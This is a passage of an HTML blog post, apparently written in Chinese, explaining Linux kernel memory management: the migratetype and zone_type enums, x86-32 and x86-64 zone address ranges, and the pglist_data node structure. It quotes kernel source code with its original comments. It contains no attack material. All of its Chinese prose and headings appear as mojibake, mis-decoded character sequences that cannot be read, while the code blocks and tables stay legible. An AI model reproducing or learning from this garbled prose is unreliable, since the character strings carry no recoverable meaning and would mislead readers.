ç®¡ç†çš„é¡µé¢æ•°é‡</strong></p><p>è¯¥å­—æ®µç”¨ä»¥æ ‡è¯† zone ä¸­ buddy system ç®¡ç†çš„é¡µé¢æ•°é‡</p><p><strong>flagsï¼šæ ‡å¿—ä½</strong></p><p>è¯¥ zone çš„æ ‡å¿—ä½ï¼Œç”¨ä»¥æ ‡è¯†å…¶æ‰€å¤„çš„çŠ¶æ€</p><h3 id="é¡µé¢è¿ç§»æœºåˆ¶"><a href="#é¡µé¢è¿ç§»æœºåˆ¶" class="headerlink" title="é¡µé¢è¿ç§»æœºåˆ¶"></a>é¡µé¢è¿ç§»æœºåˆ¶</h3><p>é¡µé¢è¿ç§»ä¸»è¦ç”¨ä»¥è§£å†³å†…æ ¸ç©ºé—´ä¸­çš„ç¢ç‰‡é—®é¢˜ï¼Œåœ¨é•¿æœŸçš„è¿è¡Œä¹‹åå†…å­˜å½“ä¸­ç©ºé—²é¡µé¢çš„åˆ†å¸ƒå¯èƒ½æ˜¯é›¶æ•£çš„ï¼Œè¿™ä¾¿å¯¼è‡´äº†å†…æ ¸æœ‰å¯èƒ½æ— æ³•æ˜ å°„åˆ°è¶³å¤Ÿå¤§çš„è¿ç»­å†…å­˜ï¼Œå› æ­¤éœ€è¦è¿›è¡Œé¡µé¢è¿ç§»å³å°†æ—§çš„é¡µé¢è¿ç§»åˆ°æ–°çš„ä½ç½®ï¼Œç›¸ä¿¡å¤§å®¶åœ¨æ“ä½œç³»ç»Ÿè¯¾éƒ½å­¦ä¹ è¿‡çš„ã€‚</p><p>ä½†å¹¶éæ‰€æœ‰çš„é¡µé¢éƒ½æ˜¯èƒ½å¤Ÿéšæ„è¿ç§»çš„ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ buddy system å½“ä¸­è¿˜éœ€è¦å°†é¡µé¢æŒ‰ç…§è¿ç§»ç±»å‹è¿›è¡Œåˆ†ç±»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">MIGRATE_UNMOVABLE,</span><br><span class="line">MIGRATE_MOVABLE,</span><br><span class="line">MIGRATE_RECLAIMABLE,</span><br><span class="line">MIGRATE_PCPTYPES,<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment"> * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment"> * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment"> * __free_pageblock_cma() function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">MIGRATE_ISOLATE,<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿ç§»ç±»å‹ç”±ä¸Šé¢çš„æšä¸¾ç±»å‹å®šä¹‰ã€‚</p><ul><li>  MIGRATE_UNMOVABLEï¼šè¿™ç±»å‹é¡µé¢åœ¨å†…å­˜å½“ä¸­æœ‰ç€å›ºå®šçš„ä½ç½®ï¼Œä¸èƒ½ç§»åŠ¨</li><li>  MIGRATE_MOVABLEï¼šè¿™ç±»é¡µé¢å¯ä»¥éšæ„ç§»åŠ¨ï¼Œä¾‹å¦‚ç”¨æˆ·ç©ºé—´çš„é¡µé¢ï¼Œæˆ‘ä»¬åªéœ€è¦å¤åˆ¶æ•°æ®åæ”¹å˜é¡µè¡¨æ˜ å°„å³å¯</li><li>  MIGRATE_RECLAIMABLEï¼šè¿™ç±»é¡µé¢ä¸èƒ½ç›´æ¥ç§»åŠ¨ï¼Œä½†æ˜¯å¯ä»¥åˆ é™¤ï¼Œä¾‹å¦‚æ˜ å°„è‡ªæ–‡ä»¶çš„é¡µ</li><li>  MIGRATE_PCPTYPESï¼š<code>per_cpu_pageset</code>ï¼Œå³æ¯ CPU é¡µå¸§ç¼“å­˜ï¼Œå…¶è¿ç§»ä»…é™äºåŒä¸€èŠ‚ç‚¹å†…</li><li>  MIGRATE_ISOLATEï¼šä¸èƒ½ä»è¯¥é“¾è¡¨åˆ†é…é¡µé¢ï¼Œè¯¥é“¾è¡¨ç”¨äºè·¨ NUMA èŠ‚ç‚¹è¿›è¡Œé¡µé¢ç§»åŠ¨ï¼Œå°†é¡µé¢ç§»åŠ¨åˆ°ä½¿ç”¨è¯¥é¡µé¢æœ€ä¸ºé¢‘ç¹çš„ CPU æ‰€å¤„èŠ‚ç‚¹</li><li>  MIGRATE_TYPESï¼šè¡¨ç¤ºè¿ç§»ç±»å‹çš„æ•°ç›®ï¼Œå¹¶ä¸å­˜åœ¨è¿™ä¸€é“¾è¡¨</li></ul><h3 id="zoneåˆ†ç±»"><a href="#zoneåˆ†ç±»" class="headerlink" title="zoneåˆ†ç±»"></a>zoneåˆ†ç±»</h3><p>åœ¨ Linux kernel å½“ä¸­ï¼Œæˆ‘ä»¬æ ¹æ®å†…å­˜åŒºæ®µçš„ä¸åŒç”¨é€”ï¼Œå°†å…¶åˆ’åˆ†ä¸ºä¸åŒçš„ zone</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_DMA and ZONE_DMA32 are used when there are peripherals not able</span></span><br><span class="line"><span class="comment"> * to DMA to all of the addressable memory (ZONE_NORMAL).</span></span><br><span class="line"><span class="comment"> * On architectures where this area covers the whole 32 bit address</span></span><br><span class="line"><span class="comment"> * space ZONE_DMA32 is used. ZONE_DMA is left for the ones with smaller</span></span><br><span class="line"><span class="comment"> * DMA addressing constraints. This distinction is important as a 32bit</span></span><br><span class="line"><span class="comment"> * DMA mask is assumed when ZONE_DMA32 is defined. Some 64-bit</span></span><br><span class="line"><span class="comment"> * platforms may need both zones as they support peripherals with</span></span><br><span class="line"><span class="comment"> * different DMA addressing limitations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">ZONE_DMA,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA32</span></span><br><span class="line">ZONE_DMA32,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Normal addressable memory is in ZONE_NORMAL. DMA operations can be</span></span><br><span class="line"><span class="comment"> * performed on pages in ZONE_NORMAL if the DMA devices support</span></span><br><span class="line"><span class="comment"> * transfers to all addressable memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A memory area that is only addressable by the kernel through</span></span><br><span class="line"><span class="comment"> * mapping portions into its own address space. This is for example</span></span><br><span class="line"><span class="comment"> * used by i386 to allow the kernel to address the memory beyond</span></span><br><span class="line"><span class="comment"> * 900MB. The kernel will set up special mappings (page</span></span><br><span class="line"><span class="comment"> * table entries on i386) for each page that the kernel needs to</span></span><br><span class="line"><span class="comment"> * access.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_HIGHMEM,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE is similar to ZONE_NORMAL, except that it contains</span></span><br><span class="line"><span class="comment"> * movable pages with few exceptional cases described below. Main use</span></span><br><span class="line"><span class="comment"> * cases for ZONE_MOVABLE are to make memory offlining/unplug more</span></span><br><span class="line"><span class="comment"> * likely to succeed, and to locally limit unmovable allocations - e.g.,</span></span><br><span class="line"><span class="comment"> * to increase the number of THP/huge pages. Notable special cases are:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1. Pinned pages: (long-term) pinning of movable pages might</span></span><br><span class="line"><span class="comment"> *    essentially turn such pages unmovable. Therefore, we do not allow</span></span><br><span class="line"><span class="comment"> *    pinning long-term pages in ZONE_MOVABLE. When pages are pinned and</span></span><br><span class="line"><span class="comment"> *    faulted, they come from the right zone right away. However, it is</span></span><br><span class="line"><span class="comment"> *    still possible that address space already has pages in</span></span><br><span class="line"><span class="comment"> *    ZONE_MOVABLE at the time when pages are pinned (i.e. user has</span></span><br><span class="line"><span class="comment"> *    touches that memory before pinning). In such case we migrate them</span></span><br><span class="line"><span class="comment"> *    to a different zone. When migration fails - pinning fails.</span></span><br><span class="line"><span class="comment"> * 2. memblock allocations: kernelcore/movablecore setups might create</span></span><br><span class="line"><span class="comment"> *    situations where ZONE_MOVABLE contains unmovable allocations</span></span><br><span class="line"><span class="comment"> *    after boot. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment"> * 3. Memory holes: kernelcore/movablecore setups might create very rare</span></span><br><span class="line"><span class="comment"> *    situations where ZONE_MOVABLE contains memory holes after boot,</span></span><br><span class="line"><span class="comment"> *    for example, if we have sections that are only partially</span></span><br><span class="line"><span class="comment"> *    populated. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment"> * 4. PG_hwpoison pages: while poisoned pages can be skipped during</span></span><br><span class="line"><span class="comment"> *    memory offlining, such pages cannot be allocated.</span></span><br><span class="line"><span class="comment"> * 5. Unmovable PG_offline pages: in paravirtualized environments,</span></span><br><span class="line"><span class="comment"> *    hotplugged memory blocks might only partially be managed by the</span></span><br><span class="line"><span class="comment"> *    buddy (e.g., via XEN-balloon, Hyper-V balloon, virtio-mem). The</span></span><br><span class="line"><span class="comment"> *    parts not manged by the buddy are unmovable PG_offline pages. In</span></span><br><span class="line"><span class="comment"> *    some cases (virtio-mem), such pages can be skipped during</span></span><br><span class="line"><span class="comment"> *    memory offlining, however, cannot be moved/allocated. These</span></span><br><span class="line"><span class="comment"> *    techniques might use alloc_contig_range() to hide previously</span></span><br><span class="line"><span class="comment"> *    exposed pages from the buddy again (e.g., to implement some sort</span></span><br><span class="line"><span class="comment"> *    of memory unplug in virtio-mem).</span></span><br><span class="line"><span class="comment"> * 6. ZERO_PAGE(0), kernelcore/movablecore setups might create</span></span><br><span class="line"><span class="comment"> *    situations where ZERO_PAGE(0) which is allocated differently</span></span><br><span class="line"><span class="comment"> *    on different platforms may end up in a movable zone. ZERO_PAGE(0)</span></span><br><span class="line"><span class="comment"> *    cannot be migrated.</span></span><br><span class="line"><span class="comment"> * 7. Memory-hotplug: when using memmap_on_memory and onlining the</span></span><br><span class="line"><span class="comment"> *    memory to the MOVABLE zone, the vmemmap pages are also placed in</span></span><br><span class="line"><span class="comment"> *    such zone. Such pages cannot be really moved around as they are</span></span><br><span class="line"><span class="comment"> *    self-stored in the range, but they are treated as movable when</span></span><br><span class="line"><span class="comment"> *    the range they describe is about to be offlined.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In general, no unmovable allocations that degrade memory offlining</span></span><br><span class="line"><span class="comment"> * should end up in ZONE_MOVABLE. Allocators (like alloc_contig_range())</span></span><br><span class="line"><span class="comment"> * have to expect that migrating pages in ZONE_MOVABLE can fail (even</span></span><br><span class="line"><span class="comment"> * if has_unmovable_pages() states that there are no unmovable pages,</span></span><br><span class="line"><span class="comment"> * there can be false negatives).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_MOVABLE,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DEVICE</span></span><br><span class="line">ZONE_DEVICE,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">__MAX_NR_ZONES</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>  ZONE_DMAï¼šç›´æ¥å†…å­˜è®¿é—®åŒºåŸŸï¼Œä½¿ç”¨ DMA å†…å­˜æƒ…å†µ :æœ‰äº›è®¾å¤‡æ¶æ„æ¯”è¾ƒè€ , æ— æ³•ç›´æ¥è®¿é—®æ•´ä¸ªå†…å­˜ , éœ€è¦ä½¿ç”¨ DMA ç›´æ¥å†…å­˜è®¿é—®åŒºåŸŸ ;</li><li>  ZONE_DMA32ï¼šå¯¹åº”çš„æ˜¯64ä½ç³»ç»Ÿ , DMA32åŒºåŸŸã€‚å¯ä»¥æ”¯æŒä¸¤ç§è®¾å¤‡çš„è®¿é—®ï¼Œåªèƒ½ç›´æ¥è®¿é—® 16 MB ä»¥ä¸‹çš„å†…å­˜è®¾å¤‡ï¼›åªèƒ½ç›´æ¥è®¿é—® 4 GB ä»¥ä¸‹çš„å†…å­˜è®¾å¤‡ã€‚</li><li>   ZONE_NORMALï¼šæ™®é€šå†…å­˜åŒºåŸŸï¼Œè¯¥å†…å­˜åŒºåŸŸ å¯ä»¥ ç›´æ¥æ˜ å°„åˆ° â€œ å†…æ ¸è™šæ‹Ÿåœ°å€ç©ºé—´ â€œã€‚</li><li>   ZONE_HIGHMEMï¼šé«˜ç«¯å†…å­˜åŒºåŸŸï¼Œè¿™æ˜¯32ä½æ¶æ„ä¸­çš„æ¦‚å¿µï¼Œ<code>DMA</code> å’Œ <code>DMA32</code> åˆç§°ä¸ºâ€ä½ç«¯å†…å­˜åŒºåŸŸâ€ã€‚</li><li>   ZONE_MOVABLEï¼šâ€å¯ç§»åŠ¨åŒºåŸŸâ€ , è¿™æ˜¯ä¸ºäº†é˜²æ­¢â€å†…å­˜ç¢ç‰‡â€çš„ä¼ªå†…å­˜åŒºã€‚</li><li>   ZONE_DEVICEï¼šâ€è®¾å¤‡åŒºåŸŸâ€, è¿™æ˜¯ä¸ºäº†æ”¯æŒâ€å†…å­˜çƒ­æ’æ‹”â€è€Œè®¾ç½®çš„å†…å­˜åŒºåŸŸ , æ¯ä¸ªè®¾å¤‡åŒºåŸŸä½¿ç”¨ zone ç»“æ„ä½“è¡¨ç¤ºã€‚</li></ul><p>å¤§è‡´æ€»ç»“ä¸€ä¸‹ï¼Œä¸‹é¢å…ˆçœ‹X86-32</p><table><thead><tr><th>Type</th><th>Start address</th><th>End address</th></tr></thead><tbody><tr><td>ZONE_DMA</td><td>0MB</td><td>16MB</td></tr><tr><td>ZONE_NORMAL</td><td>16MB</td><td>896MB</td></tr><tr><td>ZONE_HIGHMEM</td><td>896MB</td><td>â€¦</td></tr></tbody></table><p>X86-64</p><table><thead><tr><th>Type</th><th>Start address</th><th>End address</th></tr></thead><tbody><tr><td>ZONE_DMA</td><td>0MB</td><td>16MB</td></tr><tr><td>ZONE_DMA32</td><td>16MB</td><td>4GB</td></tr><tr><td>ZONE_NORMAL</td><td>4GB</td><td>â€¦</td></tr></tbody></table><h2 id="struct-pglist-data"><a href="#struct-pglist-data" class="headerlink" title="struct pglist_data"></a>struct pglist_data</h2><p>zoneä¸Šä¸€å±‚åˆ™æ˜¯èŠ‚ç‚¹ï¼ŒLinuxå°†å†…å­˜æ§åˆ¶å™¨ä½œä¸ºèŠ‚ç‚¹åˆ’åˆ†çš„ä¾æ®ï¼Œå¯¹äº UMA æ¶æ„è€Œè¨€åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè€Œå¯¹äº NUMA æ¶æ„è€Œè¨€é€šå¸¸æœ‰å¤šä¸ªèŠ‚ç‚¹ï¼Œå¯¹äºåŒä¸€ä¸ªå†…å­˜æ§åˆ¶å™¨ä¸‹çš„ CPU è€Œè¨€å…¶å¯¹åº”çš„èŠ‚ç‚¹ç§°ä¹‹ä¸ºæœ¬åœ°å†…å­˜ï¼Œä¸åŒå¤„ç†å™¨ä¹‹é—´é€šè¿‡æ€»çº¿è¿›è¡Œè¿›ä¸€æ­¥çš„è¿æ¥ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/hAopSNYg23VeWzq.png"                                     ></p><p>ä¸€ä¸ªèŠ‚ç‚¹ä½¿ç”¨<code>pglist_data</code>ç»“æ„è¿›è¡Œæè¿°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node_zones contains just the zones for THIS node. Not all of the</span></span><br><span class="line"><span class="comment"> * zones may be populated, but it is the full list. It is referenced by</span></span><br><span class="line"><span class="comment"> * this node&#x27;s node_zonelists as well as other node&#x27;s node_zonelists.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node_zonelists contains references to all zones in all nodes.</span></span><br><span class="line"><span class="comment"> * Generally the first zones will be references to this node&#x27;s</span></span><br><span class="line"><span class="comment"> * node_zones.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> nr_zones; <span class="comment">/* number of populated zones in this node */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FLATMEM<span class="comment">/* means !SPARSEMEM */</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Must be held any time you expect node_start_pfn,</span></span><br><span class="line"><span class="comment"> * node_present_pages, node_spanned_pages or nr_zones to stay constant.</span></span><br><span class="line"><span class="comment"> * Also synchronizes pgdat-&gt;first_deferred_pfn during deferred page</span></span><br><span class="line"><span class="comment"> * init.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * pgdat_resize_lock() and pgdat_resize_unlock() are provided to</span></span><br><span class="line"><span class="comment"> * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment"> * or CONFIG_DEFERRED_STRUCT_PAGE_INIT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Nests above zone-&gt;lock and zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_start_pfn;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_present_pages; <span class="comment">/* total number of physical pages */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_spanned_pages; <span class="comment">/* total size of physical page</span></span><br><span class="line"><span class="comment">     range, including holes */</span></span><br><span class="line"><span class="keyword">int</span> node_id;</span><br><span class="line"><span class="keyword">wait_queue_head_t</span> kswapd_wait;</span><br><span class="line"><span class="keyword">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* workqueues for throttling reclaim for different reasons. */</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> reclaim_wait[NR_VMSCAN_THROTTLE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">atomic_t</span> nr_writeback_throttled;<span class="comment">/* nr of writeback-throttled tasks */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr_reclaim_start;<span class="comment">/* nr pages written while throttled</span></span><br><span class="line"><span class="comment"> * when throttling started. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">kswapd_lock</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span><span class="comment">/* Protected by kswapd_lock */</span></span><br><span class="line"><span class="keyword">int</span> kswapd_order;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kswapd_highest_zoneidx</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> kswapd_failures;<span class="comment">/* Number of &#x27;reclaimed == 0&#x27; runs */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line"><span class="keyword">int</span> kcompactd_max_order;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_highest_zoneidx</span>;</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="keyword">bool</span> proactive_compact_trigger;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a per-node reserve of pages that are not available</span></span><br><span class="line"><span class="comment"> * to userspace allocations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node reclaim becomes active if more unmapped pages exist.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>min_unmapped_pages;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write-intensive fields used by page reclaim */</span></span><br><span class="line">CACHELINE_PADDING(_pad1_);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If memory initialisation on large machines is deferred then this</span></span><br><span class="line"><span class="comment"> * is the first PFN that 